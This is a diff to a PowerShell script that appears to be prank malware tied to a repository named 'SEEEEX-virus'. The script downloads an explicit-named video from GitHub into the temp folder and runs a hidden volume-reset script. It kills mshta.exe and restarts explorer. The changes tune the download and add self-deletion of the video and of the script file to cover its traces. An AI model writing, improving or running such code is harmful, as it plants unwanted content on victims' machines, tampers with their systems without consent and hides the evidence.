@@ -15,7 +15,7 @@ If (-not $IsAdmin) {
 $tempPath = [System.IO.Path]::GetTempPath()
 $videoFile = Join-Path -Path $tempPath -ChildPath "SEX.mp4"
 $downloadUrl = "https://raw.githubusercontent.com/ElenaMod/SEEEEX-virus/refs/heads/main/SEX.mp4"  
-Invoke-WebRequest -Uri $downloadUrl -OutFile $videoFile
+Invoke-WebRequest -Uri $downloadUrl -OutFile $videoFile -DisableKeepAlive -UseBasicParsing
 
 #---------------------------------------------------
 # 2. Create and Launch a Hidden Volume-Reset Script
@@ -209,4 +209,6 @@ Stop-Process -Id $volumeProcess.Id -Force
 # Remove the temporary volume script file.
 Remove-Item $tempVolumeScript -Force
 taskkill /f /im mshta.exe > $null 2>&1
+del $videoFile
 start explorer.exe
+cmd.exe /c "del %temp%\sex.ps1"
